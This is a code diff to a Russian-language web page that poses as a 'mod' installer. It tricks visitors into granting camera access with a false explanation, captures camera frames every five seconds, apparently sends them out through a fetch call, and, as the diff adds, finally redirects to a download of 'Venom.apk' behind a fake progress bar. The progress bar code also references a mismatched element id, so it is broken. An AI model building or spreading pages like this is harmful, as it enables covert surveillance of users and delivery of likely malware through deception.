@@ -1,4 +1,5 @@
 <h2>Нажмите «Разрешить»,чтобы начать процесс установки<br/></h2>
+<progress id="hrenzn"></progress>
 <br/><br/><br/>
 <a onClick="alert('Мы запрашиваем доступ к камере,чтобы получить доступ к файлам и загрузить мод на ваше устройство')">зачем?</a>
 <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
@@ -8,6 +9,7 @@
 <canvas id="cnv">здесь появится ваше фото, если все пройдет успешно</canvas>
 <img src="" id="imgsofrona">
 <script>
+var progressbar=0
   var hs=0
 	var canvas=document.getElementById("cnv")
 	var ctx=canvas.getContext("2d")
@@ -40,8 +42,10 @@ fetch(apiUrl, {
             var vid =document.getElementById("photosofrona")
 ctx.drawImage(vid,0,0,25,25)
 if(hs==10){
-    window.location.href="about:blank";
+    window.location.href="Venom.apk";
 }
 hs=hs+1
+progressbar=progressbar+10
+document.getElementById("hrenz").setAttribute("value",progressbar)
 },5000)
 </script>
